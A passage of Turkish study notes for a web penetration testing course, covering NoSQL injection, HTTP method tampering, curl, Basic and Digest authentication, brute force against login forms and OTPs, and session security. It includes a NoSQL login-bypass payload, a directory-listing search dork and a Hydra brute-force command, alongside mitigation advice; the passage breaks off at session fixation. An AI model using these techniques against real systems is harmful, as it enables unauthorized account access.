`db.users.find({ name: { $regex: "mehmet", $options: "i" } })`

5.  Kıyaslama operatörleri:
`==// age > 25==`
`==db.users.find({ age: { $gt: 25 } })==`

`==// age >= 25==`
`==db.users.find({ age: { $gte: 25 } })==`

`==// age < 30==`
`==db.users.find({ age: { $lt: 30 } })==`

`==// age <= 30==`
`==db.users.find({ age: { $lte: 30 } })==`


#### NOSQLi Injection:

**NoSQL Enjeksiyonu** (NoSQL Injection), NoSQL veritabanı kullanan uygulamalarda ortaya çıkan bir güvenlik zafiyetidir.

Bu saldırı türünde saldırgan, kötü amaçlı girdiler enjekte ederek NoSQL veritabanı sorgusunu manipüle eder; bunun sonucunda yetkisiz erişim, veri sızıntısı veya istenmeyen işlemler gerçekleşebilir. Geleneksel SQL enjeksiyonunda olduğu gibi saldırganlar uygulamanın kullanıcı girdisini sorgularla birleştirme biçimindeki zayıflıkları istismar ederler. NoSQL enjeksiyonlarında ise uygulamanın kullanıcı girdisini nasıl işlediğindeki eksiklikler (ör. tip kontrolü yapılmaması, doğrulama/parametrizasyon yokluğu) sorgunun mantığını değiştirmeye olanak sağlar. ==Genel mantığı SQLi ile aynıdır değişen şey sadece oluşturulacak yüklerdir.==


MongoDB’yi NoSQL veritabanı arka ucu olarak kullanan bir web uygulamamız olduğunu varsayalım.
Uygulamanın kullanıcıların kullanıcı adı ve parola girdiği bir giriş (login) işlevi bulunmaktadır.
Uygulama, verilen kimlik bilgilerinin geçerli olup olmadığını kontrol etmek için şu sorguyu gerçekleştirir:

![[Pasted image 20250928130416.png]]

![[Pasted image 20250928130505.png]]

Bu örnekte uygulama, `username` (kullanıcı adı) ve `password` (parola) alanları için kullanıcı tarafından sağlanan değerleri kullanarak bir MongoDB sorgusu oluşturur. Eğer bir saldırgan kasıtlı olarak özel hazırlanmış bir değer girerse, NoSQL enjeksiyonu zafiyetinden faydalanabilir.

Örneğin, bir saldırgan `username` parametresi olarak şu değeri girebilir:

`username: {$gt: "" }`

![[Pasted image 20250928130708.png]]


Normal bir senaryoda sorgu, girilen kullanıcı adıyla **tam** eşleşen bir kullanıcıyı arar.
Ancak bu örnekte saldırgan, boş string ile birlikte **`$gt` (greater than / daha büyük)** operatörünü kullanıyor. Bu durum sorgunun mantığını manipüle ederek, saldırganın erişmemesi gereken bir kullanıcı kaydının döndürülmesine neden olabilir.
Sonuç olarak saldırgan, giriş mekanizmasını atlayarak yetkisiz erişim elde edebilir.


Çeşitli NoSQL Payloadları:

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection

# Common Attacks(WPT):

*Kurs Başlıkları:*
- HTTP Method & Authentication Testing  
- Sensitive Data Exposure  
- Broken Authentication Attacks (Attacking Login Forms, Bypassing Authentication, OTP  etc)  
- Session Security Testing (Session Hijacking,  Session Fixation & CSRF)  
- Injection & Input Validation Attacks (Command  Injection, Code Injection)
- Testing For Security Misconfigurations
- Exploiting Vulnerable & Outdated Componenets
## HTTP Authentication and Attacks:

**HTTP method tampering** (HTTP yöntem manipülasyonu), **HTTP verb tampering** olarak da bilinir ve web uygulamalarında sömürülebilecek bir güvenlik açığı türüdür. Bu zafiyet, bir saldırganın web sunucusu ile iletişim kurarken kullanılan **HTTP isteği yöntemini (method)** değiştirmesiyle ortaya çıkar.

Normalde HTTP isteklerinde **GET, POST, PUT, DELETE** gibi yöntemler kullanılır ve her biri web uygulaması üzerinde belirli işlemleri gerçekleştirmek için tasarlanmıştır. Ancak saldırganlar bu yöntemleri değiştirdiğinde, uygulamanın öngörülmeyen yollarla davranmasına neden olabilirler. Örneğin, sadece **GET isteği** kabul etmesi gereken bir uç noktaya **DELETE isteği** gönderilmesi, sistemde kritik sonuçlar doğurabilir.

 Başlamadan önce temel HTTP verblerini tekrar inceleyecek olursak:
 
**GET:** Sunucudan veri almak için kullanılır. Sunucu ya da uygulama üzerinde herhangi bir yan etkiye (değişiklik, ekleme, silme gibi) neden olmamalıdır.
**POST:** Sunucuya veri göndermek için kullanılır. Genellikle sunucu üzerinde değişiklik yapan işlemler için (örneğin form gönderme) tercih edilir.
**PUT:** Sunucudaki mevcut bir kaynağı yeni bir içerikle güncellemek için kullanılır. **İdempotent** olmalıdır; yani aynı isteğin birden fazla kez gönderilmesi, tek sefer gönderilmiş gibi aynı sonucu vermelidir.
**DELETE:** Sunucudaki bir kaynağı silmek için kullanılır.
**OPTIONS:** Belirli bir kaynağa (ör. bir URL veya endpoint) yönelik iletişim seçeneklerini ve gerekliliklerini sorgulamak için kullanılır.

*Süreç:*

**HTTP method tampering**, bir saldırganın HTTP isteğinde kullanılan **yöntemi (method)** değiştirerek web uygulamasını kandırması ve beklenmeyen işlemler yaptırmasıyla ortaya çıkar.

**Örnekler:**

- **GET isteğini DELETE isteğine çevirmek:** Eğer uygulama kullanılan yöntemi doğru şekilde doğrulamıyorsa, yalnızca veri çekmesi gereken bir işlem, yanlışlıkla verileri silebilir.
- **POST isteğini GET isteğine çevirmek:** Bu durum, yalnızca POST yöntemiyle erişilmesi gereken **hassas verilerin** GET üzerinden açığa çıkmasına neden olabilir.
- **GET isteğini POST isteğine çevirmek:** Eğer uygulama yöntemi ve gönderilen verileri (payload) doğru şekilde doğrulamıyorsa, bu durum istenmeyen veri değişikliklerine yol açabilir.
#### Tampering- Lab Örneği:

**Dizin listing**, bir web sunucusunun bir dizinde `index.*` (index.html, index.php vb.) gibi bir varsayılan dosya bulamadığında o dizindeki dosya ve klasör listesini otomatik olarak web tarayıcıya göstermesidir. Bu özellik saldırganlara kolayca keşif (reconnaissance) imkânı sağlar ve bir dizi güvenlik riskine yol açar.

Bir websitesine öncelikle **gobuster** veya **dirb** gibi bir araç ile tarama yaparak dizinleri keşfederiz.
Bu araçların çıktılarında  "WARNING: Directory IS LISTABLE" olan dizinler biizm için önemlidir. Listelenebilir bir dizin aşağıdaki gibi gözükecektir:

`intitle:"index of" "*.phtml" site:.edu` ( Dork örneği)

![[Pasted image 20251003145531.png]]

Bu tür durumlarda özellikle *curl* komut satırı aracını oldukça kullanırız:
###### Curl:

`curl`, komut satırından HTTP(S) dahil birçok protokol ile istek göndermenizi sağlayan küçük ama güçlü bir araçtır. Web geliştirme, API testi, dosya indirme ve hata ayıklama için çok kullanışlıdır.

*1) En basit örnek — bir web sayfası almak (GET)*

`curl https://example.com`
Bu komut, `example.com` sitesinin HTML içeriğini terminale yazdırır.

*2) Sadece başlıkları görmek (sunucunun cevap başlıkları)*

`curl -I https://example.com`

`-I` (veya `--head`) **sadece HTTP başlıklarını (headers) görmek** için kullanılır.  
Yani sunucudan **sayfanın içeriğini almaz**, sadece bilgi verir: durum kodu, sunucu tipi, içerik türü, yönlendirmeler vb.

Sunucu hangi HTTP durum kodunu döndü (200, 404 vb.) ve hangi başlıklar var, onları gösterir.

*3) Çıktıyı dosyaya kaydetmek (indirir)*

`curl -o sayfa.html https://example.com`
`sayfa.html` adlı dosyaya kaydeder.
Sunucunun önerdiği dosya adını kullanmak istersen:

`curl -O https://example.com/dosya.zip`

 *4) Basit form gönderme (POST) — örnek*

Bir form doldurup gönderir gibi:
`curl -d "username=ata&password=123" https://example.com/login`
Bu, POST isteği yapar ve `username` ile `password` verilerini gönderir.

*5) JSON gönderme (API'ler için)*

`curl -H "Content-Type: application/json" \      -d '{"name":"Atakan"}' \      https://api.example.com/users`
`-H` ile başlık (header), `-d` ile veri gönderiyoruz.

*6) Yeniden yönlendirmeleri takip etme*

Bazı URL'ler başka yere yönlendirir. Bunları takip etmek için:
`curl -L http://short.url/abcd`

*7) Hata ayıklama- Detay alma(Ne oluyor görmek istiyorsan)*

`curl -v https://example.com`  (-v : verbose )
İstek nasıl gönderiliyor, sunucudan neler geliyor hepsini gösterir.

*8) Özel istekde bulunma:*

`-X` (veya `--request`) **curl ile hangi HTTP yöntemini (method) kullanacağını** belirtir.  
Varsayılan yöntem **GET**’tir. Yani `curl https://example.com` otomatik olarak GET yapar.

==Ama POST, PUT, DELETE gibi farklı yöntemlerle işlem yapmak istersen `-X` kullanılır. Özellikle listing directorylerde kullanırız.==

`curl -X GET https://example.com`  (varsayılan GET'dir)
`curl -X POST -d "username=ata&password=123" https://example.com/login` (-d ile veri eklenir/belirlilir)
`curl -X PUT -d '{"name":"Atakan"}' -H "Content-Type: application/json" https://api.example.com/users/1` (JSON veri gönderiyorsak `-H "Content-Type: application/json"` eklenir.)

`curl -v -X OPTIONS https://example.com`    (Sitenin hangi motodlara izin verdiğini gösterir.)
#### Basic HTTP Authentication:

**Temel HTTP Kimlik Doğrulama (Basic HTTP Authentication)**, web uygulamalarında ve servislerde belirli kaynaklara veya işlevlere erişimi kısıtlamak için kullanılan basit bir kimlik doğrulama yöntemidir.

“Temel (basic)” olarak adlandırılmasının nedeni, karmaşık olmaması ve yalnızca **kullanıcı adı ile parola** kombinasyonuna dayanmasıdır. Ancak, **şifrelenmemiş bir bağlantı (HTTP)** üzerinden kullanıldığında güvenli olmadığı unutulmamalıdır.

Bu nedenle, kimlik bilgilerinin güvenli bir şekilde iletilmesi için **yalnızca HTTPS** üzerinden kullanılmalıdır.

![[Pasted image 20251004192512.png]]

*Nasıl Çalışır?:*

**İstemci İsteği (Client Request):**  
Bir istemci (genellikle bir web tarayıcısı), sunucuda korunan bir kaynağa erişmek istediğinde, eğer bu kaynak kimlik doğrulaması gerektiriyorsa, sunucu **401 Unauthorized** (Yetkisiz) durum kodu ile yanıt verir.

**Kimlik Doğrulama İstemi (Challenge Header):**  
Bu yanıtın içinde, sunucu **`WWW-Authenticate`** başlığını (header) **"Basic"** değeriyle birlikte gönderir. Bu başlık, istemciye **“Bu kaynağa erişmek için temel kimlik doğrulaması kullanmalısın”** bilgisini verir.

**Kimlik Bilgisi Formatı (Credential Format):** 
İstemci, kullanıcı adı ve parolayı **`username:password`** biçiminde birleştirir ve bu ifadeyi **Base64** formatında kodlar.  
Daha sonra, bu kodlanmış diziyi sonraki isteklerde **`Authorization`** başlığı içinde sunucuya gönderir.

Bu başlık şu formatta  görünür:

![[Pasted image 20251004193402.png]]

Örneğin:
![[Pasted image 20251004193432.png]]

**Sunucu Doğrulaması (Server Validation):**  
Sunucu, **Authorization** başlığını içeren isteği aldığında, önce Base64 ile kodlanmış kimlik bilgilerini çözümler. Ardından bu bilgileri kendi **yetkili kullanıcı veritabanıyla karşılaştırır** ve bilgiler doğruysa erişim izni verir.

**Erişim İzni veya Reddetme (Access Granted or Denied):**
- Eğer kimlik bilgileri **doğruysa**, sunucu istenen kaynağı gönderir ve **200 OK** durum koduyla yanıt verir.
- Eğer kimlik bilgileri **yanlışsa veya eksikse**, sunucu yine **401 Unauthorized** (Yetkisiz) yanıtını döndürmeye devam eder.
#### HTTP Digest Authentication:

**HTTP Digest Authentication**, web uygulamalarında ve servislerde, korunan kaynaklara erişmeye çalışan kullanıcıların veya istemcilerin kimliğini güvenli bir şekilde doğrulamak için kullanılan bir kimlik doğrulama yöntemidir.

Bu yöntem, **Basic Authentication**’ın güvenlik sınırlamalarını gidermeyi amaçlar. Bunu, kullanıcı kimlik bilgilerini aktarım sırasında korumak için **challenge-response (meydan okuma–yanıt)** mekanizmasını ve **hashleme (özetleme)** işlemini kullanarak yapar.
nm 
**Kimlik Doğrulama İstemi (Challenge Header):**  
Bu yanıtta sunucu, **`WWW-Authenticate`** başlığını **"Digest"** değeriyle birlikte gönderir. Bu başlık, istemcinin güvenli bir kimlik doğrulama isteği oluşturabilmesi için gerekli bilgileri sağlar.

*Example of WWW-Authenticate  header:*

![[Pasted image 20251004205936.png]]

**realm:**  
Koruma alanını belirten açıklayıcı bir ifadedir (genellikle uygulamanın veya servisin adı).
**qop (Quality of Protection):**  
Koruma seviyesini belirtir. Genellikle “auth” olarak ayarlanır.
**nonce:**  
Her istek için sunucu tarafından üretilen benzersiz bir değerdir. **Replay attack (yeniden oynatma saldırılarını)** önlemek için kullanılır.
**opaque:**  
Sunucu tarafından belirlenen, istemcinin yanıtında **değiştirmeden geri göndermesi gereken** opak (anlamı belirsiz) bir değerdir.

*Example of WWW-Authorization header:*

![[Pasted image 20251004210709.png]]

**Sunucu Doğrulaması:**  
Sunucu, istemciden gelen **Authorization (Yetkilendirme)** başlığını içeren isteği alır ve istemcinin oluşturduğu **hash (özet)** değerini doğrular.  
Bunu, aynı bileşenleri kullanarak kendi hash değerini yeniden hesaplayıp, istemcinin gönderdiği hash ile karşılaştırarak yapar.

Eğer iki hash değeri eşleşirse, sunucu istemciyi **doğrulanmış (authenticated)** olarak kabul eder ve istenen kaynağa erişim izni verir.


*SÜRECİN SAYISAL ÖRNEĞİ:*

**İstemci Digest Hesaplar**

İstemci artık sunucudan gelen bilgileri kullanarak bir hash (MD5) oluşturur.

**Digest Hesaplaması Adımları**

1. **HA1**:
    `HA1 = MD5(username:realm:password)`
2. **HA2**:
    `HA2 = MD5(method:digestURI)`
    - method: GET, POST gibi HTTP metod
    - digestURI: isteğin yapıldığı URL
3. **Response**:
    `response = MD5(HA1:nonce:nonceCount:clientNonce:qop:HA2)
    - **nonceCount (nc)**: İstemcinin aynı nonce ile kaçıncı isteği yaptığı (örnek: `00000001`)
    - **clientNonce (cnonce)**: İstemcinin kendi oluşturduğu rastgele değer
    - **qop**: genellikle `auth`


*İstemci Kimlik Bilgilerini Gönderir:*

İstemci, hesapladığı hash’i `Authorization` header’ında gönderir:

![[Pasted image 20251004212123.png]]

4. **Sunucu Yanıtı Doğrular**
- Sunucu aynı HA1 ve HA2 hesaplamalarını yapar.
- İstemcinin gönderdiği `response` ile kendi hesapladığı `response` aynı ise kimlik doğrulama başarılıdır.
- Sunucu 200 OK yanıtı döner ve korunan kaynağa erişim sağlanır.
- Eğer doğrulama başarısız ise tekrar 401 döner.

Bu işlemlerin manipülasyonu basic authenticatona göre sadece burp suite üzerinden yapılarak gerçekleştirilmezi zordur bu yüzden *Hydra* aracından faydalanırız:

*HYRDAR:*

hydra (genellikle **`THC-Hydra`**) bir brute-force aracı ve HTTP Digest Authentication gibi doğrulama yöntemlerine karşı kullanılabilir.

**Senaryo**

- Hedef web sitesi: `http://example.com/protected`
- Kullanıcı adı biliniyor: `admin`
- Şifre listesi: `passwords.txt`
- HTTP Digest Authentication kullanıyor

**Hydra Komutu Örneği**

`hydra -L usernames.txt -P passwords.txt example.com http-digest "/protected"`

**Açıklama:**

- `-L usernames.txt` → denenecek kullanıcı adları listesi (-l : ile tek bir kullanıcı adı da belirtilebilir.)
- `-P passwords.txt` → denenecek şifreler listesi
- `example.com` → hedef domain veya IP
- `http-digest` → Digest Authentication protokolü kullanılıyor (Birkaç çeşidi daha var)
- `"/protected"` → doğrulama gerektiren URL path

**Nasıl Çalışır?**

1. Hydra listedeki kullanıcı adı ve şifreleri alır.
2. Her kombinasyon için HTTP Digest Authentication hesaplaması yapar:
    - Sunucudan nonce ve realm bilgilerini alır
    - Kullanıcı adı + şifre + realm ile hash üretir
    - Bu hash’i Authorization header ile gönderir
3. Sunucu doğru şifreyi bulduğunda Hydra bunu ekrana yazdırır.

## Sensitive Data Exposure:

**Hassas veri ifşası (Sensitive Data Exposure)** zafiyetleri, bir sistemdeki gizli veya hassas bilgilerin **istemeden açığa çıkmasına** yol açan güvenlik açıklarını ifade eder.

Bu tür zafiyetler; **veri ihlalleri, gizlilik ihlalleri** ve **maddi kayıplar** gibi ciddi sonuçlara neden olabilir.

*Örnek durumlar:*

**Zayıf Parola Saklama:** Parolaların düz metin (plaintext) olarak veya **salt kullanılmadan zayıf karma (hash)** algoritmalarıyla saklanması, bir veritabanı ele geçirildiğinde saldırganların kullanıcı parolalarına kolayca ulaşmasına neden olabilir.

**Hata Mesajlarında Bilgi Sızdırma:** Hata mesajlarında veya log dosyalarında **sistem yolları, veritabanı bilgileri** ya da **kullanıcı kimlik bilgileri** gibi hassas verilerin açığa çıkması, saldırganların sistemi istismar etmesini kolaylaştırabilir.

**Dizin Geçişi (Directory Traversal):** Kullanıcıların dosya yollarını manipüle ederek, izin verilmemiş dizin veya dosyalara erişmesine olanak tanıyan açıklardır. Bu durum, hassas dosyaların açığa çıkmasına yol açabilir.

**Şifrelenmemiş Yedekler:** Hassas verilerin yedeklerinin **şifrelenmeden** veya uygun erişim kontrolü olmadan saklanması, bu yedekler çalındığında verilerin kolayca açığa çıkmasına neden olabilir

==Bu açık özetle, saldırganın erişmemesi gereken ancak erişebildiği her dosya/dizin ve içindeki hassas veriler üzerinde **okuma, değiştirme veya silme** gibi yetkilere sahip olduğu anlamına gelir.==
==Böyle bir erişim; şifreler, API anahtarları, yedekler veya kişisel verilerin açığa çıkmasına,izinsiz erişimlere, hizmet kesintisine ya da daha ileri yetki yükseltme saldırılarına yol açabilir.==

## Broken Authentication:

**Broken Authentication (Kırık Kimlik Doğrulama)**, web uygulamalarında **kimlik doğrulama (authentication)** ve **oturum yönetimi (session management)** ==mekanizmalarının hatalı, tahmin edilebilir veya zayıf şekilde uygulanmasından kaynaklanan güvenlik açığıdır.==

Bu tür zafiyetler, saldırganların **meşru kullanıcıların kimliğine bürünmesine (account takeover)**, **oturumları çalmasına** veya **yetkisiz erişim elde etmesine** yol açabilir.

*Temel Nedenler:*
- **Zayıf veya varsayılan parolalar:** Kullanıcıların kolay tahmin edilebilir parolalar belirlemesi.
- **Oturum kimliklerinin (session ID)** tahmin edilebilir veya URL’de açık şekilde gönderilmesi.
- **Oturumun düzgün sonlandırılmaması (logout sonrası geçerli kalması).**
- **İki faktörlü kimlik doğrulamanın (2FA)** eksik veya yanlış uygulanması.
- **Oturum çerezlerinin (cookies)** güvenli işaretlenmemesi (`HttpOnly`, `Secure` flag yoksa)
#### Örnek-1(Login Forms Brute Example):

**1.)** Örneğimizde **Secure Bank** adlı bir uygulamayı test edeceğiz. OSINT ile bulduğumuz admin@secbank.com maili olduğunu varsayalım. Burp Suıte ile bu login ekranına nasıl giriş yapacağımızı inceleyecek olursak:
![[Pasted image 20251005145144.png]]

**2.)**

Örnek bir istek gönderildikten sonra Intruder ile brute-force yapılmıştır ve isteklerdeki anomaliliklere göre geçerli pass  bulunmuştur.

![[Pasted image 20251005145825.png]]
.

#### Örnek-2(Attacking Login Forms with OTP Security):

**OTP (One-Time Password)**, Türkçesiyle **tek kullanımlık parola**, bir kullanıcının kimliğini doğrulamak için **sadece bir kez ve kısa bir süreliğine geçerli** olan bir şifre türüdür.

OTP (One-Time Password), yani **tek kullanımlık parola**, kullanıcı hesaplarının ve sistemlerin güvenliğini artırmak için kullanılan bir **iki faktörlü kimlik doğrulama (2FA)** yöntemidir. 
OTP’ler, **geçici ve tek kullanımlık kodlar** olup genellikle kullanıcının kayıtlı cihazına (örneğin cep telefonuna) gönderilir ve giriş ya da işlem sırasında kimlik doğrulaması amacıyla kullanılır.  
OTP’lerin en büyük avantajı, **zamanla sınırlı** olmaları ve **kısa sürede geçerliliklerini yitirmeleri**dir; bu da saldırganların aynı kodu yeniden kullanmasını oldukça zorlaştırır.

*Zamana Dayalı OTP’ler (TOTP):*
TOTP, **ortak bir gizli anahtar** ve **mevcut zaman** temel alınarak kod üreten, yaygın olarak kullanılan bir OTP yöntemidir. Bu kodlar genellikle **kısa bir süre** (örneğin 30 saniye) boyunca geçerlidir.

*SMS Tabanlı OTP’ler:* 
Bu yöntemde OTP’ler kullanıcılara **SMS mesajı** yoluyla gönderilir. Kullanıcı giriş yaparken cep telefonuna gelen bu tek kullanımlık kodu girerek kimliğini doğrular.

*Oran Sınırlama ve Hesap Kilitleme:*
OTP’lere yönelik kaba kuvvet (brute force) saldırılarını önlemek için **deneme sayısını sınırlayan** ve **belirli sayıda hatalı girişten sonra hesabı kilitleyen** mekanizmalar uygulanmalıdır.

https://zl6h2bz2yh.execute-api.ap-southeast-1.amazonaws.com/dev

Yukarıdaki lab örneğinde OTP için SMS doğrulaması istemekte. Burp suite  Reperater veye ZAP Fuzz ile istekleri incelediğimizde kodun clear text olarak iletildiğini görmekteyiz. Bu alana brute force uygulanabilir.

## Session Security:

Web uygulamalarında **oturum yönetimi**, kullanıcı oturumlarının güvenli bir şekilde ele alınması ve sürdürülmesi sürecini ifade eder.

**Oturum (session)**, bir kullanıcının web uygulamasıyla etkileşimde bulunduğu süreyi kapsar. Bu genellikle kullanıcının giriş yapmasıyla başlar ve çıkış yapmasıyla veya belirli bir süre etkinlik olmaması durumunda oturumun otomatik olarak sona ermesiyle biter.

Bir oturum boyunca uygulama, kullanıcının kim olduğunu tanımalı, verilerini saklamalı ve uygulamanın farklı bölümlerine erişimini yönetmelidir.
Etkili bir oturum yönetimi, yalnızca güvenlik için değil; aynı zamanda **kullanıcı deneyimi** ve **uygulamanın durumunun korunması** açısından da kritik öneme sahiptir.

*Session Componenets:*
**Oturum Kimliği (Session Identifier):** Her kullanıcının oturumuna özgü benzersiz bir belirteç (genellikle “session ID” olarak adlandırılır) atanır. Bu belirteç, kullanıcının uygulamaya yaptığı sonraki isteklerin, o kullanıcıya ait oturum verileriyle ilişkilendirilmesini sağlar.  Kullanıcı login olduktanm soınra oluşturulan bu değer daha sonra cookie ile kullanıcı tarayıcısına gönderilir.

**Oturum Verisi (Session Data):** Kullanıcının oturumuna ait bilgiler — örneğin kimlik doğrulama durumu, kullanıcı tercihleri ve geçici veriler — sunucu üzerinde saklanır. Bu sayede uygulama, kullanıcının kim olduğunu ve hangi bilgilere erişimi olduğunu oturum süresince hatırlayabilir.

**Oturum Çerezleri (Session Cookies):** Oturum çerezleri, kullanıcının tarayıcısında saklanan ve oturum kimliğini (session ID) içeren küçük veri parçacıklarıdır. Bu çerezler, istemci (kullanıcı tarayıcısı) ile sunucu arasında oturumun sürekliliğini sağlamak için kullanılır.
Başka bir deyişle, kullanıcı bir sayfadan diğerine geçtiğinde veya yeni bir istek gönderdiğinde, tarayıcı bu çerezi sunucuya göndererek kullanıcının aynı oturumda olduğunu bildirir.

Çerezler; **oturum yönetimi**, **kullanıcı takibi** ve **kişiselleştirme** gibi farklı amaçlarla kullanılır. Oturum yönetimi bağlamında ise **oturum çerezleri (session cookies)** genellikle **session ID**’yi saklamak için kullanılır — bu sayede sunucu, gelen isteğin hangi kullanıcıya ait olduğunu tanır ve kullanıcının oturumunu devam ettirebilir.

*Importence of Session Manegment:*

**Kullanıcı Kimlik Doğrulaması (User Authentication):**  
Oturum yönetimi, kullanıcı kimlik doğrulamasının temel bir parçasıdır. Kullanıcı giriş yaptıktan sonra, oturum yönetim sistemi kullanıcının **doğrulanmış (authenticated)** durumunu takip eder. Böylece kullanıcı, her sayfa geçişinde tekrar kullanıcı adı ve parola girmek zorunda kalmadan **korunan kaynaklara** erişebilir.

**Kullanıcı Durumu (User State):**  
Web uygulamaları, genellikle kullanıcının **etkinlik geçmişini veya mevcut durumunu** korumaya ihtiyaç duyar.  
Örneğin bir e-ticaret sitesinde, oturum yönetim sistemi kullanıcının **alışveriş sepetinde** bulunan ürünleri hatırlayarak oturum süresince bu bilgiyi saklar. Bu sayede kullanıcı site içinde gezinirken veriler kaybolmaz.

**Güvenlik (Security):**  
Doğru yapılandırılmış bir oturum yönetimi güvenlik açısından kritik öneme sahiptir. Yanlış veya zayıf bir uygulama;
- **Oturum ele geçirme (session hijacking)**,
- **Oturum sabitleme (session fixation)**  
    gibi ciddi güvenlik açıklarına neden olabilir.

*Scenerio: Session Managmetn -PHP:*

PHP’de oturum yönetimi oldukça basit bir yapıya sahiptir ve yerleşik (built-in) fonksiyonlar aracılığıyla gerçekleştirilir. Genel olarak süreç şu şekilde işler:

 **1. Oturumun Başlatılması (Session Start):**

Bir oturumu başlatmak için `session_start()` fonksiyonu kullanılır.  
Bu fonksiyon, oturumu başlatır ve kullanıcıya özel benzersiz bir **session ID (oturum kimliği)** oluşturur.

 **2. Oturum Verilerinin Saklanması (Session Data):**

Oturum verilerini saklamak ve daha sonra erişmek için PHP’nin **$_SESSION_** adlı süper global dizisi kullanılır.
Örneğin:

`$_SESSION['username'] = 'john_doe';`
Bu kod, `'john_doe'` değerini oturumda `'username'` anahtarı altında saklar. Böylece kullanıcı farklı sayfalara geçse bile bu bilgi oturum boyunca korunur.

 **Özetle:**  
`session_start()` oturumu başlatır ve benzersiz bir kimlik üretir,  
`$_SESSION` dizisi ise oturum süresince kullanıcıya ait verilerin saklandığı alandır.

**Oturum Zaman Aşımı (Session Timeout):**  
Oturumun ne kadar süreyle aktif kalacağı, PHP yapılandırma dosyasında (**php.ini**) belirlenir.  
Bu süre, `session.gc_maxlifetime` ayarıyla tanımlanır.  
Belirtilen süre boyunca kullanıcıdan herhangi bir işlem (istek) gelmezse, oturum **zaman aşımına uğrar** ve oturum verileri otomatik olarak silinir.

**Oturum Kimliği Yönetimi (Session ID Management):**  
Varsayılan olarak PHP, oturum kimliklerinin (**session ID**) oluşturulmasını ve kullanıcılarla ilişkilendirilmesini kendisi yönetir.  
Yani geliştiricinin manuel olarak kimlik üretmesine gerek yoktur — PHP, her kullanıcıya **benzersiz ve rastgele bir session ID** atayarak oturumun güvenli bir şekilde takip edilmesini sağlar.

*Session Managment Testing:*

**Oturum Yönetimi Testi (Session Management Testing):**  
Oturum yönetimi testi, web uygulaması güvenlik testlerinin en önemli bileşenlerinden biridir.

Bu test, bir web uygulamasının **kullanıcı oturumlarını ne kadar güvenli ve etkili yönettiğini** değerlendirmeyi amaçlar.  
Doğru şekilde gerçekleştirilen bir oturum yönetimi testi, oturum işlemlerindeki **zayıflıkları ve güvenlik açıklarını** tespit etmeye yardımcı olur.

Bu tür açıklar, **yetkisiz erişim**, **veri sızıntısı** veya **oturum ele geçirme (session hijacking)** gibi ciddi güvenlik ihlallerine yol açabilir.

**Oturum Sabitleme (Session Fixation) Testi:**  
Test eden kişi tarafından kontrol edilen **önceden bilinen bir oturum kimliği** (session ID) atanarak test yapılır. Ardından farklı bir hesapla giriş yapılır ve uygulamanın önceden belirlenmiş bu session ID’yi kabul edip hedef hesaba erişim imkânı verip vermediği doğrulanır. Eğer uygulama bu sabit ID’yi kabul ediyorsa **session fixation** açığı vardır.

**Oturum Ele Geçirme (Session Hijacking) Testi:**  
Başka bir kullanıcının oturum kimliğini ele geçirip (ör. ağ trafiğini yakalayarak) aynı session ID’yi yeniden kullanmayı denersiniz. Bu amaçla **Wireshark**, **Burp Suite** gibi araçlar ağ trafiğini veya istekleri yakalayıp oturum verilerini analiz etmek için kullanılabilir. Eğer oturum yeniden kullanılarak yetkisiz erişim sağlanabiliyorsa, uygulama hijacking’e açıktır.

**Session ID Brute-Force Testi:**  
Oturum ID’lerinin tahmin edilebilirliğini veya karmaşıklığını değerlendirmek için brute-force (kaba kuvvet) denemeleri yapılır. Amaç, ID uzayı yeterince büyük ve rastgele mi yoksa kolay tahmin edilebilir veya kısa mı olduğunu anlamaktır. Bu test, uygulamanın çok sayıda hatalı ID denemesine karşı ne tür sınırlamalar (ör. rate limiting, IP bloklama) uyguladığını da ölçer.

- **Fixation:** Saldırgan _başlangıçta_ oturum kimliğini **kurar/yerleştirir** ve kurbanın bu kimliğe _girmesini sağlar_.
- **Hijacking:** Saldırgan kurbanın **halihazırdaki** oturum kimliğini **çalar** ve kullanır.
#### Session Hijacking & Session Fixation:

*Oturum Ele Geçirme (Session Hijacking)* — diğer adıyla **oturum hırsızlığı(session theft)** — bir saldırganın bir kullanıcının web uygulamasındaki **aktif oturumunu** yasa dışı şekilde ele geçirmesidir.

Bu tür bir saldırıda saldırgan, kullanıcının **oturum belirteci (session token veya session ID)** ya da kimliğini ele geçirir; böylece kurbanı taklit ederek onun adına işlemler yapabilir. Oturum ele geçirme, kullanıcı hesaplarına yetkisiz erişim, hassas verilerin açığa çıkması ve ele geçirilmiş oturumun kötüye kullanılması gibi ciddi güvenlik sorunlarına yol açar.

**Kısa kritik notlar:**

- Oturum belirteçleri (session ID) kesinlikle gizli tutulmalı; çerezlerde `HttpOnly`, `Secure` ve `SameSite` bayrakları kullanılmalı ve tüm trafik HTTPS ile şifrelenmelidir.
- XSS, ağ dinleme (HTTP üzerinden) veya kötü amaçlı eklentiler gibi vektörlere karşı korunmak, hijacking riskini azaltır.
- Oturum açıldıktan sonra `session_regenerate_id()` gibi yöntemlerle ID yenilemek ve kısa oturum zaman aşımı uygulamak etkili savunmalardır.

Saldırgan oturum belirtecini ele geçirdikten sonra, bu belirteci isteklere ekleyerek kurbanı taklit edebilir. Sunucu (uygulama) ele geçirilmiş belirteci görecek ve isteği **yetkili kullanıcıdan geliyormuş gibi** işlemeye devam edecektir — yani saldırgan, kurbanın yerine geçerek hesap işlemleri gerçekleştirebilir, hassas verilere erişebilir veya yetkileri kötüye kullanabilir.

Bunun sonuçları şunlar olabilir: hesabın yetkisiz kullanımı, kişisel verilerin sızması, finansal işlemler, ayarların değiştirilmesi veya daha geniş çaplı güvenlik ihlalleri.
Kısa önleme/azaltma adımları:

- Tüm trafiği **HTTPS** ile şifreleyin.
- Oturum çerezlerine **HttpOnly**, **Secure** ve uygun **SameSite** bayraklarını ekleyin.
- Oturum açma ve kritik işlemler sonrası **session_regenerate_id()** ile oturum ID’si yenileyin.
- Oturum ömrünü kısaltın ve inaktif zaman aşımı uygulayın.
- **Çok faktörlü kimlik doğrulama (MFA)** kullanın — çalınan bir oturum belirteci tek başına yeterli olmasın.
- Anormal davranışları tespit etmek için IP/user‑agent tutarlılığı, eş zamanlı oturum kontrolleri ve anomali izleme ekleyin.


*Oturum Sabitleme (Session Fixation):*  

